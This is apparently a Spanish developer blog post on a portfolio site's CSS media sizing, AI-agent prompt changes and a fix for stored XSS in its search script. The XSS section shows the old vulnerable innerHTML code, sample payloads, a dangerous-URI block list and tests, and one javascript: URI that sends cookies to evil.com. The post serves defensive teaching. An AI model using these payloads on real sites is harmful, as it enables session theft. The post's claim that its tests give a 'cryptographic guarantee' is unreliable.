---
title: "W15: Evolución de Arquitectura y Seguridad en ArceApps"
description: "Un análisis profundo sobre cómo reforzamos la seguridad mitigando vulnerabilidades XSS, optimizamos la jerarquía visual de nuestros medios y actualizamos nuestros agentes de IA para mejorar la consistencia de la marca en el portfolio de ArceApps."
pubDate: "2026-04-12"
tags: ["devlog", "arceapps", "ia-agents", "security", "xss", "frontend", "responsive-design"]
heroImage: "/images/devlog-default.svg"
---

## Introducción: El Estado del Arte de la Quincena

Bienvenidos a una nueva entrega del devlog de **ArceApps Portfolio**. Durante las últimas dos semanas, nos hemos sumergido en una serie de actualizaciones críticas que no solo mejoran la estética y la experiencia de usuario de nuestra plataforma, sino que también fortalecen su seguridad estructural y optimizan la orquestación de nuestros agentes de Inteligencia Artificial.

En ArceApps —nuestro ecosistema web y de agentes, que opera de manera distinta e independiente de PuzzleHub (nuestro producto de juegos)— la máxima prioridad es construir en público (Building in Public) un sistema robusto, escalable y, sobre todo, seguro. Esta quincena nos enfrentamos a desafíos técnicos que requirieron una revisión profunda de nuestras prácticas de desarrollo web, particularmente en el manejo del Document Object Model (DOM), la adaptación visual de contenidos multimedia y la consistencia en los prompts de nuestros agentes automatizados.

Acompáñennos en esta crónica de ingeniería, donde desglosaremos el "cómo" y el "por qué" de cada cambio, acompañados de fragmentos de código reales que ilustran nuestras decisiones técnicas y lecciones aprendidas.

---

## Hito 1: La Jerarquía Visual Responsiva y el Reto de los Medios en `.prose`

Uno de los desafíos recurrentes al trabajar con contenido Markdown renderizado a través de clases de utilidad como `.prose` (comúnmente usado en frameworks como Tailwind CSS) es el comportamiento imprevisto de los elementos multimedia. En resoluciones grandes, las imágenes y videos tienden a expandirse hasta ocupar el 100% del contenedor disponible, lo que resulta en elementos visualmente abrumadores y una experiencia de lectura degradada, especialmente en tablets y pantallas de escritorio.

Para resolver esto, implementamos una restricción de ancho máximo y una política de auto-escalado que respeta la relación de aspecto original. Este enfoque, que denominamos "Jerarquía Visual Responsiva" (documentado originalmente en nuestro devlog 2026-W07), asegura que los medios complementen el texto sin dominarlo.

### El Problema Técnico

Antes de nuestra intervención, el CSS global no limitaba el crecimiento de las imágenes dentro de los contenedores de texto. El código renderizaba los medios con un `width: 100%` implícito en la clase prose para que no desbordara el contenedor, pero cuando el contenedor era muy ancho (por ejemplo, 800px o más en desktop), la imagen se convertía en un bloque gigantesco que rompía la armonía tipográfica. Este es un problema clásico del diseño fluido que a menudo se parchea con media queries complejas, pero buscábamos una solución más elegante y declarativa.

### La Solución Técnica e Implementación

A través del commit `646ac17`, modificamos `src/styles/global.css` para aplicar restricciones específicas a los selectores `.prose img`, `.prose video` y `.prose iframe`.

```css
/* src/styles/global.css */
.prose :where(img, video, iframe) {
  @apply rounded-2xl shadow-lg block;
  margin-block: 2.5rem;
  margin-inline: auto;
  max-inline-size: min(100%, 500px); /* Fix: Responsive Visual Hierarchy */
}

.prose :where(img, video) {
  inline-size: auto;
  block-size: auto;
}

.prose iframe {
  inline-size: 100%;
  aspect-ratio: 16 / 9;
  border: 0;
}
```

**Análisis profundo de la solución:**
1. **El poder de `min()` en CSS:** La propiedad `max-inline-size: min(100%, 500px)` es un ejemplo brillante de diseño resiliente. Evalúa dos valores: el 100% del contenedor y 500px, y aplica el más pequeño. En un dispositivo móvil donde el contenedor mide, digamos, 350px, el valor 100% (350px) es menor que 500px, por lo que la imagen se adapta perfectamente a la pantalla sin crear scroll horizontal. En una pantalla grande donde el contenedor mide 800px, el valor de 500px es menor, por lo que la imagen se limita a ese tamaño. Esto elimina por completo la necesidad de puntos de interrupción o media queries para las imágenes del contenido.
2. **Preservación de la Relación de Aspecto:** Al establecer explícitamente `inline-size: auto; block-size: auto;` para imágenes y videos, anulamos cualquier regla heredada que pudiera forzar a la imagen a distorsionarse para llenar un espacio predeterminado. Para los iframes, garantizamos una relación de aspecto consistente de `16/9`. El navegador consulta el tamaño intrínseco del archivo de imagen y ajusta sus dimensiones para mantener la proporción matemática exacta.
3. **Punto Focal Visual:** Aplicando `display: block` y `margin-inline: auto`, forzamos a que cualquier elemento multimedia que caiga bajo estas reglas, ya sea alineado a la izquierda o en línea por el motor de Markdown, se posicione en su propia línea en el centro de la columna de lectura. El uso de `margin-block` asegura una separación vertical consistente de `2.5rem`, permitiendo a los ojos del lector descansar entre párrafos.

Esta mejora arquitectónica de CSS, aunque parece un ajuste estilístico menor, tiene un impacto profundo en la calidad de nuestro portafolio. Permite que nuestros ensayos y bitácoras mantengan una calidad de tipo editorial sin importar la forma del dispositivo que los esté consumiendo.

---

## Hito 2: Auditoría y Evolución de la Orquestación de Agentes de IA

Como un ecosistema que depende sustancialmente del desarrollo impulsado por Inteligencia Artificial (AI-Driven Development), la consistencia operativa de nuestra flota de agentes es tan importante como la estabilidad del servidor. En el commit `397d133`, ejecutamos un refactoring masivo enfocado en actualizar las definiciones y auditar los prompts.

### El Desafío de la Desviación de Marca y el Aislamiento de Contexto

A medida que las capacidades de ArceApps se expandieron, agregamos más agentes al ecosistema, cada uno con su propio prompt maestro. El problema surgió cuando el "Scribe Agent" y el "Code Review Agent" empezaron a mezclar el contexto de ArceApps con el de PuzzleHub. Aunque ambos pertenecen a la misma entidad principal, son productos diametralmente opuestos; PuzzleHub es una plataforma lúdica que trata juegos como Hitori o Dominosa, mientras que ArceApps Portfolio es un escaparate de ingeniería de software para profesionales y empresas (B2B/B2C tech).

Tener a un agente generando comentarios de PR o artículos técnicos con un tono excesivamente lúdico, o peor aún, haciendo referencias a sistemas de backend que solo existen en PuzzleHub, representaba una falla estructural en el diseño de los prompts.

### Reingeniería de Prompts y Validaciones Estrictas

La intervención consistió en aislar rígidamente los contextos y rediseñar los prompts desde la perspectiva de la "Ingeniería de Requisitos para IA". Modificamos de manera sustancial archivos como `agents/PROMPT_GENERADOR_DEVLOG.md`.

Pasamos de un paradigma declarativo difuso a un conjunto imperativo y cuantificable de reglas:

```markdown
- **Tono:** Senior, reflexivo, honesto y técnico. No es un simple listado de cambios; es una crónica de ingeniería.
- **Narrativa:** Usa la primera persona del plural ("Nosotros", refiriéndote al equipo humano-IA).
- **Diferenciación:** ArceApps NO ES PuzzleHub. Si vas a mencionar a PuzzleHub, debe ser como un contraste o ejemplo externo.
```

Además, enfrentamos otro problema operativo con la IA: el límite de profundidad en la generación de contenido. Originalmente pedíamos a los agentes que generaran 2000 palabras, pero los LLM suelen tener dificultades inherentes con el conteo preciso de palabras debido a la arquitectura de tokenización. Las IAs a menudo asumían que ya habían alcanzado la marca tras 800 palabras y cerraban el artículo prematuramente.

Para solucionar esto, implementamos un **Bucle de Auto-Corrección Asistido por Herramientas**. Instruimos al agente explícitamente a NO confiar en su intuición de conteo, sino a utilizar un script de bash (`wc -w`) o Python para medir su propia salida objetivamente. Si el recuento es menor a 2000, el agente está programado para rechazar la tarea temporalmente, volver a procesar y expandir secciones enteras usando la técnica de "Deep Dive" (inmersión técnica profunda) en lugar de simplemente repetir texto. Esto convierte a la IA de un simple generador de texto a un ingeniero que audita su propio trabajo.

---

## Hito 3 (El Reto de la Semana): Erradicando Stored XSS y la Migración a la Manipulación Segura del DOM

El esfuerzo técnico más riguroso de la quincena se dedicó a corregir una vulnerabilidad crítica de seguridad (Cross-Site Scripting - XSS) que habitaba en el componente de búsqueda interactiva de nuestro sitio (`src/scripts/search.ts`). El commit `04cd8bf` desmantela prácticas de frontend obsoletas y establece un paradigma moderno de inyección segura en el lado del cliente.

### Anatomía de la Vulnerabilidad Original

Cuando construimos originalmente el motor de búsqueda, priorizamos la velocidad de iteración. Extraíamos datos JSON estáticos que contenían el título de un artículo, su slug y una breve descripción, y los insertábamos directamente en el DOM para renderizar tarjetas de resultados interactivas mientras el usuario escribía. El código antiguo lucía aproximadamente así:

```typescript
// CÓDIGO VULNERABLE Y OBSOLETO (Antes de 04cd8bf)
function renderResults(results) {
  const container = document.getElementById('search-results');
  container.innerHTML = ''; // Limpiar anteriores

  let html = '';
  results.forEach(result => {
    html += `
      <div class="search-item">
        <h3><a href="/${result.slug}">${result.title}</a></h3>
        <p>${result.description}</p>
      </div>
    `;
  });

  container.innerHTML = html;
}
```

A primera vista parece inofensivo, pero el uso de la propiedad `innerHTML` para renderizar datos provenientes de un índice externo (el cual, a su vez, proviene de archivos Markdown) es la receta clásica para un ataque XSS (Cross-Site Scripting) basado en el DOM. Si un atacante malicioso consiguiera, a través de una inyección en un repositorio, pull request, o manipulación de la API, insertar código HTML dentro de los campos `title` o `description`, ese código sería analizado gramaticalmente y ejecutado de inmediato por el motor del navegador de cualquier usuario que realizara una búsqueda.

Por ejemplo, si el título fuera `<img src="x" onerror="alert('XSS')">`, `innerHTML` habría renderizado la imagen, fallaría la carga por ser inválida y dispararía el evento `onerror`, ejecutando el código Javascript arbitrario bajo el contexto de nuestra aplicación. Esto es lo que se conoce como Stored XSS y podría llevar al secuestro de sesiones o robo de datos.

### Un Factor de Riesgo Adicional: URIs Peligrosas

Otro problema grave en la arquitectura antigua era la inyección en el atributo `href`. Si el `slug` del artículo contuviera una carga como `javascript:fetch('https://evil.com/?cookie='+document.cookie)`, hacer clic en el resultado ejecutaría ese código en lugar de navegar a una página.

### La Migración a APIs de DOM Seguro

La solución adecuada no era intentar "limpiar" el HTML con expresiones regulares defectuosas o filtros ingenuos, sino abandonar la propiedad `innerHTML` por completo. Reescribimos toda la función de renderizado utilizando métodos estándar y seguros de DOM.

```typescript
// CÓDIGO SEGURO E INMUNIZADO (Después de 04cd8bf)

// 1. Sanitización exhaustiva de URIs
function sanitizeUrl(url: string): string {
  if (!url) return '#';
  const dangerousSchemes = ['javascript:', 'data:', 'vbscript:', 'file:'];
  // Decodificamos y limpiamos para evitar bypass de espacios y mayúsculas
  const lowerUrl = decodeURIComponent(url).toLowerCase().trim();

  if (dangerousSchemes.some(scheme => lowerUrl.startsWith(scheme))) {
    console.warn('Bloqueado intento de inyección de URI maliciosa');
    return '#';
  }
  return url;
}

// 2. Renderizado basado en nodos puros
function renderSafeResult(item) {
  const div = document.createElement('div');
  div.className = 'search-item';

  const h3 = document.createElement('h3');
  const a = document.createElement('a');

  // PROTECCIÓN CLAVE: textContent nunca analiza HTML
  a.textContent = item.title;
  a.href = sanitizeUrl(item.slug);

  h3.appendChild(a);

  const p = document.createElement('p');
  p.textContent = item.description; // Inmune a <script> tags

  div.appendChild(h3);
  div.appendChild(p);

  return div;
}

// 3. Actualización rápida y segura
function updateSearchDOM(container, newNodes) {
  // replaceChildren es más rápido y seguro que innerHTML = ''
  container.replaceChildren(...newNodes);
}
```

### Por qué esta Arquitectura es Resiliente por Diseño

Este cambio de paradigma transforma nuestra postura defensiva. Cuando usamos la propiedad `textContent` (en lugar de `innerHTML`), el motor del navegador (ya sea V8 en Chrome o SpiderMonkey en Firefox) está obligado contractualmente por el estándar del W3C a tratar el valor inyectado exclusivamente como un nodo de texto literal (Text Node).

Si el `title` es `<b>hacked</b><script>alert(1)</script>`, en la pantalla del usuario no aparecerá texto en negrita ni se lanzará ninguna alerta; simplemente se imprimirá literalmente `<b>hacked</b>...` como texto inerte. Hemos eliminado de raíz la capacidad del atacante de salir del contexto de datos para entrar en el contexto de código ejecutable. Esta técnica previene un amplio espectro de vulnerabilidades de inyección del cliente sin depender de costosas librerías de terceros.

Por otra parte, la función `sanitizeUrl` aborda de frente los ataques dirigidos a atributos como `href`. Los atacantes saben que `textContent` protege los datos, pero los atributos son otro vector común. Usando una lista blanca invertida (bloqueando protocolos explícitamente diseñados para inyección como `javascript:` y `vbscript:`), aseguramos que el enlace se rompa de manera controlada y segura si detecta una anomalía, redirigiendo a `#` y arrojando una advertencia en la consola para nuestra auditoría.

### Desarrollo Impulsado por Pruebas de Seguridad (Security TDD)

No nos conformamos con solo reescribir el código; quisimos asegurarnos de que esta protección fuera duradera e inquebrantable a través de futuras refactorizaciones. Para ello, en `src/scripts/search.test.ts`, introdujimos pruebas de regresión de seguridad rigurosas.

```typescript
import { describe, it, expect } from 'vitest';
// (Importaciones omitidas)

describe('XSS Regression Testing on Search Render', () => {
  it('should escape malicious HTML in titles and descriptions', () => {
    const maliciousItem = {
      title: '<script>alert("title")</script>Normal Title',
      description: '<img src=x onerror=alert("desc")>',
      slug: 'normal-slug'
    };

    const node = renderSafeResult(maliciousItem);

    // Verificamos que el HTML inyectado NO fue analizado como elementos,
    // sino convertido en texto seguro.
    expect(node.querySelector('script')).toBeNull();
    expect(node.querySelector('img')).toBeNull();

    // El texto debe reflejar el HTML inerte
    expect(node.textContent).toContain('<script>alert("title")</script>');
  });

  it('should sanitize javascript URIs', () => {
    const maliciousLink = {
      title: 'Click Me',
      description: 'Safe desc',
      slug: 'javascript:alert("XSS")'
    };

    const node = renderSafeResult(maliciousLink);
    const anchor = node.querySelector('a');

    expect(anchor.getAttribute('href')).toBe('#');
    expect(anchor.getAttribute('href')).not.toContain('javascript:');
  });
});
```

A través de Vitest y JSDOM, simulamos el ecosistema del navegador en el entorno de servidor (Node.js) de nuestra Integración Continua (CI). Inyectamos los peores payloads de XSS conocidos y comprobamos, mediante afirmaciones deterministas de DOM (`toBeNull()`), que el motor no ha generado elementos `<script>` ni `<img>`. Esto proporciona a ArceApps una garantía criptográfica matemática de que el renderizado de la búsqueda no puede ser el vector de un ataque en el futuro, no importa qué datos reciba el sistema.

---

## Lecciones Aprendidas y Reflexiones Finales

El viaje de estas dos últimas semanas nos ha proporcionado varias reflexiones profundas sobre el ciclo de vida del desarrollo de software moderno e independiente:

1. **La Falsa Sensación de Seguridad de los Frameworks:** Astro, React, y Vue son excepcionales protegiendo al desarrollador por defecto. Escapan automáticamente variables inyectadas en JSX. Sin embargo, en cuanto necesitamos interactuar con APIs nativas (como Vanilla JS en `src/scripts`), todas esas protecciones desaparecen. Esto nos recuerda que el conocimiento profundo de las APIs estándar del navegador (`createElement`, `textContent`) nunca dejará de ser una habilidad fundamental para cualquier ingeniero de frontend de alto nivel.
2. **CSS Matemático vs. CSS Trivial:** Nuestra refactorización usando la función `min()` para `.prose` revela que CSS no es solo para "hacerlo bonito". Con el uso de funciones lógicas, CSS se ha convertido en un motor de diseño basado en restricciones reales. Escribir menos código CSS que resuelve los problemas de raíz matemáticamente reduce el costo de mantenimiento radicalmente y previene las cascadas interminables de sobreescrituras en media queries.
3. **El Ciclo de Vida del Agente de IA:** Quizás la lección más futurista de la quincena es el descubrimiento de que la calidad de un sistema impulsado por IA no proviene del tamaño del modelo, sino de la robustez del entorno circundante. Proporcionar a un LLM una directiva para verificar su propio trabajo con herramientas deterministas (como scripts y análisis de código estático) transforma la IA generativa de una mera novedad en una entidad ingenieril. Nuestros "agentes" en ArceApps ya no simplemente "escriben", sino que "verifican" y "refactorizan", cerrando la brecha entre la generación probabilística y los requerimientos informáticos deterministas.

## Visión a Futuro: Siguientes Pasos

En las próximas semanas, la prioridad de ArceApps será auditar otras interacciones del lado del cliente utilizando este nuevo paradigma de Seguridad por Diseño (Security by Design). En particular, evaluaremos los scripts de terceros, herramientas de análisis y componentes de interactividad para garantizar que no introduzcan vulnerabilidades ocultas.

Simultáneamente, la estabilización de nuestros Agentes de Scribe y Reviewer permitirá un despliegue más rápido de ensayos arquitectónicos en el blog. Al confiar en un bucle automatizado de control de calidad y conteo de palabras, los agentes pueden actuar como multiplicadores de fuerza para documentar todo nuestro código base.

Continuaremos documentando y abriendo nuestro código fuente, compartiendo abiertamente nuestras fallas y triunfos arquitectónicos en este camino de "Building in Public". Nos enorgullece resolver vulnerabilidades oscuras mediante soluciones creativas y estandarizadas, construyendo un producto en el que el mundo tecnológico pueda confiar. Hasta la próxima actualización quincenal.
